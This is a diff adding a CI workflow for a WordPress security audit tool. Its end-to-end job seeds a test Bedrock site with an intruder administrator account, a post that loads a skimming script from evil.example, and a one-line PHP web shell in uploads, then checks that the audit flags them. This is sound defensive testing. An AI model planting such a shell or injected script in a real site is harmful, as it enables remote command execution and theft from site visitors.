@@ -1,0 +1,108 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  unit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+      - run: go vet ./...
+      - run: go test -race ./...
+      - name: Lint the scripts
+        run: |
+          php -l collector.php
+          shellcheck -s sh hasher.sh
+
+  # One real audit end to end: a fresh Bedrock site on MySQL, seeded with
+  # what the audit must catch and what it must leave alone. Covers what unit
+  # tests can't: the collector against a real WordPress and database, and
+  # the hasher with GNU find.
+  e2e:
+    runs-on: ubuntu-latest
+    services:
+      mysql:
+        image: mysql:8.4
+        env:
+          MYSQL_ROOT_PASSWORD: root
+          MYSQL_DATABASE: wp
+        ports: ["3306:3306"]
+        options: >-
+          --health-cmd="mysqladmin ping -proot" --health-interval=5s --health-timeout=5s --health-retries=20
+    env:
+      XDG_CONFIG_HOME: ${{ runner.temp }}/config
+      XDG_STATE_HOME: ${{ runner.temp }}/state
+      SITE: ${{ runner.temp }}/site
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+      - uses: shivammathur/setup-php@v2
+        with:
+          php-version: "8.3"
+          tools: composer, wp-cli
+      - run: go build -o "$RUNNER_TEMP/wp-data-audit" ./cmd/wp-data-audit
+
+      - name: A Bedrock site
+        run: |
+          composer create-project --no-interaction --quiet roots/bedrock "$SITE"
+          cd "$SITE"
+          cat > .env <<'EOF'
+          DB_NAME=wp
+          DB_USER=root
+          DB_PASSWORD=root
+          DB_HOST=127.0.0.1
+          WP_ENV=development
+          WP_HOME=http://localhost
+          WP_SITEURL=${WP_HOME}/wp
+          EOF
+          wp --path=web/wp core install --url=http://localhost --title=ci --admin_user=admin \
+            --admin_email=admin@agency.example --admin_password=ci-only --skip-email
+          git init -q && git add -A
+          git -c user.name=ci -c user.email=ci@agency.example commit -q -m site
+
+      - name: What the audit must catch, and what it must not
+        working-directory: ${{ env.SITE }}
+        run: |
+          wp --path=web/wp user create intruder intruder@evil.example --role=administrator --user_pass=ci-only
+          wp --path=web/wp post create --post_status=publish --post_title=hacked \
+            --post_content='<p>x</p><script src="https://evil.example/skim.js"></script>'
+          mkdir -p web/app/uploads/2026
+          printf '<?php system($_GET["c"]);' > web/app/uploads/shell.php
+          printf '<?php // Silence is golden.' > web/app/uploads/2026/index.php
+          : > web/app/uploads/empty.php
+          printf 'dump' > web/app/uploads/backup.sql
+          mkdir -p "$XDG_CONFIG_HOME/wp-data-audit"
+          echo '{"staff_domains":["agency.example"],"staff_emails":["admin@agency.example"]}' > "$XDG_CONFIG_HOME/wp-data-audit/config.json"
+
+      - name: Audit
+        working-directory: ${{ env.SITE }}
+        run: |
+          set +e
+          "$RUNNER_TEMP/wp-data-audit" --env ci --wp "wp --path=web/wp" --sh "env -i PATH=/usr/bin:/bin sh -s" --json -v > "$RUNNER_TEMP/report.json"
+          code=$?
+          set -e
+          cat "$RUNNER_TEMP/report.json"
+          [ "$code" = 1 ] || { echo "exit $code, want 1 (flags found)"; exit 1; }
+
+      - name: Check the report
+        run: |
+          r="$RUNNER_TEMP/report.json"
+          has() { jq -e "$1" "$r" > /dev/null || { echo "missing: $2"; exit 1; }; }
+          hasnt() { ! jq -e "$1" "$r" > /dev/null || { echo "unexpected: $2"; exit 1; }; }
+          has '.flags | any(.kind == "user" and (.untrusted // "" | contains("intruder@evil.example")))' "the intruder admin"
+          has '.flags | any(.kind == "content" and (.untrusted // "" | contains("evil.example")))' "the script in a post"
+          has '.flags | any(.kind == "file" and (.untrusted // "" | contains("shell.php")))' "the PHP shell under uploads"
+          hasnt '.flags | any(.kind == "file" and (.untrusted // "" | test("index.php|empty.php")))' "a guard file flagged"
+          hasnt '.flags | any(.kind == "release")' "a core or vendor file differing from the install"
+          hasnt '.notes | any(.problem and (.text | test("collector failed|hasher failed")))' "a script that failed"
